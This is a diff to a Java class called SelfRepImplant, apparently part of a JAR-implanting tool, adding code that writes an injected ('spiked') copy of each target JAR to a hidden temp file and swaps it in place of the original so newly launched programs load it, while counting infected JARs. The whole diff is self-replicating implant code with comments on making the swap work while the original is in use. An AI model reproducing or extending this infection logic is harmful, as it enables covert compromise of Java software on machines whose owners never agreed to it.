@@ -123,9 +123,12 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             }
 
             try {
+                Path outputTempFile = getTempFilePathFor(jarToImplant);
                 JarFiddler jar = JarFiddler.buffer(jarToImplant);
                 injector.injectInto(jar);
-                jar.write(jarToImplant);
+                jar.write(outputTempFile);
+                System.out.println("[+] JarPlant '" + jarToImplant.getFileName() + "' -> '" + outputTempFile.getFileName() + "'.");
+                doTheSwitcharoo(jarToImplant, outputTempFile);
                 numInfected++;
                 System.out.println("[+] Spiked JAR '" + jarToImplant + "'.");
             } catch (IOException e) {
@@ -240,6 +243,65 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         } catch (IOException e) {
             return false;
         }
+    }
+
+    private static Path getTempFilePathFor(Path existingJar) throws IOException {
+        String targetFilename = existingJar.getFileName().toString();
+
+        String newFileName = "." + targetFilename + ".tmp";
+        Path tempFilePath = existingJar.resolveSibling(newFileName);
+        if (Files.exists(tempFilePath)) {
+            System.out.println("[-] Temporary file '" + tempFilePath + "' already exist! Aborting.");
+            throw new IOException("File already exist: " + tempFilePath);
+        }
+        if (!Files.isWritable(tempFilePath.getParent())) {
+            System.out.println("[-] Path '" + tempFilePath.getParent() + "' is not writable! Aborting.");
+            throw new IOException("Not writable: " + tempFilePath);
+        }
+
+        return tempFilePath;
+    }
+
+    private static void doTheSwitcharoo(Path original, Path spiked) throws IOException {
+        // First move the original JAR (that may be in use at the moment)
+        Path moved = original.resolveSibling("." + original.getFileName().getFileName() + ".cache");
+        if (Files.exists(moved)) {
+            /*
+             * It looks like this JAR has already been spiked, but JarPlant did not catch that (or something else is
+             * very off). Just try to back down from this mess.
+             * A tempting alternative would be to always create these '.cache' files with a random file name suffix.
+             * This will litter the directory and eventually fill up the disk, which is worse.
+             * The problem is that there's no _reliable_ way of cleaning up these files when it's unknown if they're
+             * in use or not, so they'll be around forever. One way could be to move them into /tmp and hope for
+             * the best. Another way is to use a shutdown hook to delete the file, but that will not work if there's
+             * another JVM using the file.
+             */
+            Files.delete(spiked);
+            throw new IOException("File already exist: " + moved);
+        }
+        Files.move(original, moved);
+        System.out.println("[+] Moved '" + original.getFileName() + "' -> '" + moved.getFileName() + "'.");
+
+        // Then replace the target with the temporary (spiked) JAR
+        Files.move(spiked, original);
+        System.out.println("[+] Moved '" + spiked.getFileName() + "' -> '" + original.getFileName() + "'.");
+
+        /*
+         * Any open file handler to the original JAR should now be pointing to a .cache file (on POSIX-like systems)
+         * but any newly launched apps wishing to load the target JAR will pick up the spiked version. This will likely
+         * not work on Windows systems.
+         * Any Java process running on _this_ system will still be able to load any classes in JARs on the classpath.
+         * However, it is unclear if this file moving trick will work over network shares or even on Docker volumes.
+         */
+
+        // Don't do this for real later...
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+            try {
+                Files.delete(moved);
+            } catch (IOException e) {
+                System.out.println("[+] Deleted '" + moved + "'.");
+            }
+        }));
     }
 
     private static Optional<String> getHostname() {
